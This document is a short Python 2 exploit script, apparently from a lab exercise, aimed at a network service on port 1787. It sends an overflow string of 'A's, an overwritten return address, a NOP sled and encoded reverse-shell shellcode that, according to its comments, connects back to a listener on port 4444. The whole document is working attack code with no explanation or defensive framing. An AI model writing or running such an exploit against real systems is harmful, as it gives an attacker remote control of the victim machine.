#!/usr/bin/python

import socket
import os
import sys

buff = "BUFF /.:/"
buff += "A" * 1945
# VERBOSE=false, LHOST=10.50.156.38, LPORT=4444, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
# AutoVerifySession=true
buf =  b""
buf += b"\xeb\x23\x5b\x89\xdf\xb0\x5e\xfc\xae\x75\xfd\x89"
buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb2"
buf += b"\x34\x74\x08\x46\x80\x3e\x5e\x75\xee\xeb\xea\xff"
buf += b"\xe1\xe8\xd8\xff\xff\xff\x92\x5e\x6e\x7a\x10\x92"
buf += b"\x92\x92\xf2\x1b\x77\xa3\x52\xf6\x19\xc2\xa2\x19"
buf += b"\xc0\x9e\x19\xc0\x86\x19\xe0\xba\x9d\x25\xd8\xb4"
buf += b"\xa3\x6d\x3e\xae\xf3\xee\x90\xbe\xb2\x53\x5d\x9f"
buf += b"\x93\x55\x70\x60\xc0\xc5\x19\xc0\x82\x19\xd8\xae"
buf += b"\x19\xde\x83\xea\x71\xda\x93\x43\xc3\x19\xcb\xb2"
buf += b"\x93\x41\x19\xdb\x8a\x71\xa8\xdb\x19\xa6\x19\x93"
buf += b"\x44\xa3\x6d\x3e\x53\x5d\x9f\x93\x55\xaa\x72\xe7"
buf += b"\x64\x91\xef\x6a\xa9\xef\xb6\xe7\x76\xca\x19\xca"
buf += b"\xb6\x93\x41\xf4\x19\x9e\xd9\x19\xca\x8e\x93\x41"
buf += b"\x19\x96\x19\x93\x42\x1b\xd6\xb6\xb6\xc9\xc9\xf3"
buf += b"\xcb\xc8\xc3\x6d\x72\xcd\xcd\xc8\x19\x80\x79\x1f"
buf += b"\xcf\xfa\xa1\xa0\x92\x92\xfa\xe5\xe1\xa0\xcd\xc6"
buf += b"\xfa\xde\xe5\xb4\x95\x6d\x47\x2a\x02\x93\x92\x92"
buf += b"\xbb\x56\xc6\xc2\xfa\xbb\x12\xf9\x92\x6d\x47\xc2"
buf += b"\xc2\xc2\xc2\xd2\xc2\xd2\xc2\xfa\x78\x9d\x4d\x72"
buf += b"\x6d\x47\x05\xf8\x97\xfa\x98\xa0\x0e\xb4\xfa\x90"
buf += b"\x92\x83\xce\x1b\x74\xf8\x82\xc4\xc5\xfa\x0b\x37"
buf += b"\xe6\xf3\x6d\x47\x17\x52\xe6\x9e\x6d\xdc\x9a\xe7"
buf += b"\x7e\xfa\x62\x27\x30\xc4\x6d\x47\xfa\xf1\xff\xf6"
buf += b"\x92\x1b\x71\xc5\xc5\xc5\xa3\x64\xf8\x80\xcb\xc4"
buf += b"\x70\x6f\xf4\x55\xd6\xb6\xae\x93\x93\x1f\xd6\xb6"
buf += b"\x82\x54\x92\xd6\xc6\xc2\xc4\xc4\xc4\xd4\xc4\xdc"
buf += b"\xc4\xc4\xc1\xc4\xfa\xeb\x5e\xad\x14\x6d\x47\x1b"
buf += b"\x72\xdc\xc4\xd4\x6d\xa2\xfa\x9a\x15\x8f\xf2\x6d"
buf += b"\x47\x29\x62\x27\x30\xc4\xfa\x34\x07\x2f\x0f\x6d"
buf += b"\x47\xae\x94\xee\x98\x12\x69\x72\xe7\x97\x29\xd5"
buf += b"\x81\xe0\xfd\xf8\x92\xc1\x6d\x47\xb2\x34"



# EIP = "BBBB"
EIP = "\x31\x14\x50\x62"

NOP = "\x90" * 10

# 0x62501431
# 0x6250143e
# 0x6250144b



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.141.53", 1787))
print s.recv(1024)
s.send(buff + EIP + NOP + buf)
print s.recv(1024)
s.close()
